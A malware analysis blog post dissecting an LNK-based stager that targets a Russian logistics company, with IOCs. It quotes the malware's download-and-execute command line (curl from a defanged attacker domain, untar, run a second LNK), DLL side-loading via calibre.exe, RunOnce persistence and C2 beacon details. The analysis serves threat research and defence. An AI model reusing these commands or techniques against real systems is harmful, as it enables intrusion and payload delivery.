---
title: Stager Targeting Russian Organization
by: dmpdump
tags: downloader russia
---

On July 28, 2026, MalwareHunterTeam [shared an interesting sample](https://x.com/malwrhunterteam/status/2082210972786176480) apparently targeting a Russian speaking victim. The sample caught my attention because I don't usually come across malware targeting Russia or organizations in Russia.

* LNK name:`CGP_Заполненный_опросный_лист_по_внедрению_CommuniGate_Pro_Деловые_Линии_2026.pdf.lnk` (CGP_Completed_CommuniGate_Pro_Implementation_Questionnaire_Delovye_Linii_2026.pdf.lnk)
* SHA2: 57e37123a8c30641640bada2e0712351a457ee6c8d279926819da178d99fabaf

The LNK name suggests that: 
* The lure is associated with a CommuniGate Pro implementation. [CommuniGate Pro](https://doc.communigatepro.ru) is a corporate communications server developed by CommuniGate.
* It is associated (and likely targeting) [Delovye Linii](https://www.dellin.ru/), a Saint Petersburg-based transportation and logistics company.

A quick Shodan search suggests that CommuniGate products may have higher prevalence in Russia:

![Shodan search for Communigate](/assets/images/downloaderru/communigate.png){: width="70%" style="display: block; margin-left: auto; margin-right: auto;"}
*Figure 1: Shodan search for Communigate.*

The LNK was created on June 15, 2026 in a VMWare Windows virtual machine named `desktop-oirv4ur`. This LNK downloads a file named `communigatepro.png` (a tar, not an image) from `ncloudtechlab[.]online`, untars it, and executes a second LNK named `88.lnk` from within the tar file.

```plaintext
[String Data]
Comment (UNICODE):
Relative path (UNICODE):                ..\..\Windows\System32\rundll32.exe
Working Directory (UNICODE):            %temp%
Arguments (UNICODE):                    shell32.dll ShellExec_RunDLL conhost --"headless" cmd /c curl ncloudtechlab[.]online/XebvZG/glCigX/communigatepro/communigatepro.png -L""skontv & tar -xf nt""v&88.ln""k
Icon location (UNICODE):                .\1.pdf

[Distributed Link Tracker Properties]
Version:                                0
NetBIOS name:                           desktop-oirv4ur
Droid volume identifier:                6d39b848-40af-483a-a489-c0a27ff9bb75
Droid file identifier:                  c8d9abc5-6867-11f1-9bd7-000c29cef31e
Birth droid volume identifier:          6d39b848-40af-483a-a489-c0a27ff9bb75
Birth droid file identifier:            c8d9abc5-6867-11f1-9bd7-000c29cef31e
MAC address:                            00:0c:29:ce:f3:1e
UUID timestamp:                         06/15/2026 (03:10:38.582) [UTC]
UUID sequence number:                   7127

```
The downloaded tar file contains 3 files:
* `CGP_Заполненный_опросный_лист_по_внедрению_CommuniGate_Pro_Деловые_Линии_2026.pdf`, a decoy PDF.
* `treesn`, a tar archive.
* `88.lnk`, the second LNK, executed via the first LNK.

![Tar content](/assets/images/downloaderru/tar.png)
*Figure 2: Tar content.*

`88.lnk` is the LNK that continues the infection chain. This file opens the decoy PDF, untars the content in `treesn` to %AppData% and executes `calibre.exe` from the untared content, side-loading the malicious `calibre-launcher.dll`.

```plaintext
"relative_path": "..\\..\\Windows\\System32\\cmd.exe",
"working_directory": "%temp%",
"command_line_arguments": "/c explorer \"CGP_Заполненный_опросный_лист_по_внедрению_CommuniGate_Pro_Деловые_Линии_2026.pdf\" | tar -C %appdata% -xf treesn & \"%appdata%\\calibre.exe\"",
"icon_location": ".\\1.pdf"


"machine_id": "desktop-oirv4ur",
"droid_volume": "6d39b848-40af-483a-a489-c0a27ff9bb75",
"droid_file": "d03fde02-6afc-11f1-9bd7-000c29cef31e",
"droid_birth_volume": "6d39b848-40af-483a-a489-c0a27ff9bb75",
"droid_birth_file": "d03fde02-6afc-11f1-9bd7-000c29cef31e"
```

![Tar content2](/assets/images/downloaderru/tar2.png)
*Figure 3: treesn content.*

The decoy PDF displayed to the victim is an email system implementation questionnaire using a CommuniGate template, referring to a migration to CommuniGate Pro.

![Decoy PDF](/assets/images/downloaderru/pdf.png){: width="70%" style="display: block; margin-left: auto; margin-right: auto;"}
*Figure 4: Decoy PDF.*

The use of the legitimate `calibre.exe` executable to side-load `calibre-launcher.dll` has previously been [reported](https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders) by other researchers.


# Calibre-launcher.dll

`Calibre-launcher.dll` is a 32-bit DLL written in C++. When it is loaded, its malicious logic is executed via the `execute_python_entrypoint` exported function. There is a second exported function , `simple_print`, but this one returns without doing anything.

The DLL uses `GetModuleFileNameW` to get a path to the executable loading it (the path to `calibre.exe`). Then, it creates/checks a mutex named `Global\\LightshotsService32` to avoid duplicate execution. If the mutex does not exist, it creates a RunOnce registry persistence entry in the following path: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ /v LightshotsService`. The `LightshotService` value has the previously retrieved path to the executable loading the DLL.

After setting persistence, 3 routines with the core functionality are executed: The first one decrypts the configuration, the second one builds a beacon to the C2, and the third one contacts the C2 and retrieves additional payload.

![Main logic](/assets/images/downloaderru/mainlogic.png)
*Figure 5: Main logic in side-loaded DLL.*

The stager configuration is decrypted using AES in CTR mode. The DLL retrieves and parses an embedded blob which has the AES key, the IV, and the encrypted configuration.

![Main logic](/assets/images/downloaderru/codedecrypt.png)
*Figure 6: Decryption calls and embedded blob.*

The embedded blob includes the size of the key, the IV, and the encrypted configuration, all preceded by their corresponding sizes.

* IV size: 0x10 (16 bytes)
* IV: 54e62fc69ea8ca6c5ecaa61a31be5337
* Key size: 0x10 (16 bytes)
* Key: 4c88525415a13f21796fc24fdf6bb228
* Encrypted configuration size: 0xE7 (231 bytes)
* Encrypted configuration: 0f6bc57d867507cc4cd70b99fd812c9253a5dd95b6982af029db1d21a1de9d8172c92b9566e9c35d2c28cdf731099e40ab227e3d863964e2c970f32d3b8f5bbd3e6f396c71a155b34dfc514bbcf8b40b024928b06df72c5bccf6bd2c0f2a538a30270288f3a919f97135c16e61bb85fe9f241c35b7426853f144366dc1bc4d75bdddefc24d824badafb11142c6625772471ab13f88b0f31b5aeae13560d8fe6be3142f46cbef7d7f13372f5a75f74d90cff70399615eae5c65c8a4671a43403d3d37d50b2ba5bfdeda546ad2cbf887665d13ec1ea731a4c92fcae8a9be7d9b6dc34d18ca844549

![Main logic](/assets/images/downloaderru/blob.png)
*Figure 7: Embedded configuration.*

Decrypting the embedded blob with the parameters above reveals an RSA key and the C2 domain - once again `www.ncloudtechlab[.]online`.

![Main logic](/assets/images/downloaderru/decrypted.png)
*Figure 8: Decrypted blob.*

The following RSA public key is decrypted from the embedded blob:

```plaintext
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXYXf8W6Qlmd8ueazKUWLuDlUbLkVICtOUOpEb5T4gbBNew62peiHIjuPIhQ8541rfOT6atARxEivkz1jDO/kiL14g3t+oWTsFhURpdhsnHslsYM4sC7hxrE4vTfI3pM6okZwIOwTQx5veQTzy3kJjyB4VTNu34mcSdHlJRymK8wIDAQAB
-----END PUBLIC KEY-----
```

Next, the DLL runs another function which builds a beacon, RSA encrypts it, base64-encodes it, and sends it to the C2. The beacon includes information on the target such as:

* A 0x80 magic value 
* The 0xDEADBEEF header
* A random ID
* A 16 byte seed
* OS major version
* OS minor version
* OS build number
* Product type
* Suite mask
* Code pages (via `GetACP` and `GetOEMCP`)
* Primary IP Address
* Host name
* User name

This beacon is subsequently encrypted with the public RSA key and base 64 encoded. The `Cookie:SESSION=` string is XOR decrypted, so the encrypted/encoded beacon is sent to the C2 as a "session cookie" in the request header.

`Cookie:SESSION=<BASE64_ENCODED_RSA_ENCRYPTED_PROFILING_INFORMATION>`

Next, a C2 polling function is implemented via a loop that switches from a GET request to a POST request. The stager first makes a GET request to the C2, reading the response back. The request embeds the RSA-encrypted beacon in the header. The connection to the C2 is implemented via the WINHTTP API, and it is proxy aware. For proxy discovery purposes, the implant attempts WPAD automatic discovery. If that fails, it attempts to use the proxy configured for Internet Explorer via `WinHttpGetIEProxyConfigForCurrentUser`.

![Proxy Discovery](/assets/images/downloaderru/proxydiscovery.png)
*Figure 9: Proxy discovery attempts.*

The stager authenticates the C2 via a derived key challenge. When the beacon is generated, the stager generates a random 16-byte seed, derives an HMAC key from it using SHA-256, and transmits the seed to the C2 inside the registration beacon. The C2 RSA decrypts the beacon (it has the private key), recovers the seed, and derives the same HMAC key. On each GET request, the C2 must prove it holds this key. The C2 computes HMAC-SHA256 over 4 bytes of encrypted payload using the derived key and returns the first 12 bytes of the result in the response. The stager computes HMAC-SHA256 over the same 4 bytes using its locally held key and compares the first 12 bytes of the result against what the C2 provided. If they match, the C2 is authenticated and the implant switches to the POST method to retrieve a task.

![C2 Auth](/assets/images/downloaderru/c2auth.png)
*Figure 10: C2 Authentication via HMAC SHA256.*

The loop uses a separate routine to send POST requests to the C2, receive tasks, AES decrypt them, and execute them.

![Task Handler](/assets/images/downloaderru/taskhandler.png)
*Figure 11: Function responsible for handling C2 tasks.*

This function creates a new thread to execute the decrypted tasks received from the C2. The tasks allow the DLL to act as a stager, delivering additional payloads. The tasks obtained from the C2 contain the following fields:
* URLs to download additional payload
* Destination paths for the payloads
* An 'execute' flag
* A delay

For each of the tasks, the stager can create a directory, can create a file with GENERIC_WRITE access, and implements a file download routine using the URLs received in the task.

![Download](/assets/images/downloaderru/download.png)
*Figure 12: Creation of a directory and file for payload download.*

The function for payload download uses WINHTTP APIs to get payload from a URL sent by the C2. The downloaded payload is written to the previously created file.

![Download](/assets/images/downloaderru/download2.png)
*Figure 13: Payload download.*

The downloaded files may or may not have an 'execute' flag. When the 'execute' flag is set, the downloaded file is executed using the `CreateProcessW` API.

![Execute](/assets/images/downloaderru/execute.png)
*Figure 14: Payload execution.*

The stager uses a the `Baby::` namespace for deserialization purposes. This is a namespace that I have not seen used in malware before, and looks fairly unique - at least in the limited telemetry that I have. I could not find related samples using that namespace.

![Baby](/assets/images/downloaderru/baby.png)
*Figure 15: Baby Namespace in RTTI.*


## IOCs  
* CGP_Заполненный_опросный_лист_по_внедрению_CommuniGate_Pro_Деловые_Линии_2026.pdf.lnk: `57e37123a8c30641640bada2e0712351a457ee6c8d279926819da178d99fabaf`
* C2: `www.ncloudtechlab[.]online:443`
* communigate.png: `a8d04c3d4a97c48d33d9e14009bb3765f22242d51d9a6c9cabdaaa0bb7b22270`
* treesn: `c73b421c0d32816e23f49a60cba708b8c113126b54af74e140af8cdb62acd3d7`
* 88.lnk: `9f30f57c0fb56f08adc8fb72ceee5053becaad9d54cfdb09be08bb37b60f2a2b`
* calibre-launcher.dll: `ac8428684424dbae254570f757ac2b79eb5bf78e6dfbb0d4247fd814bb1e95cb`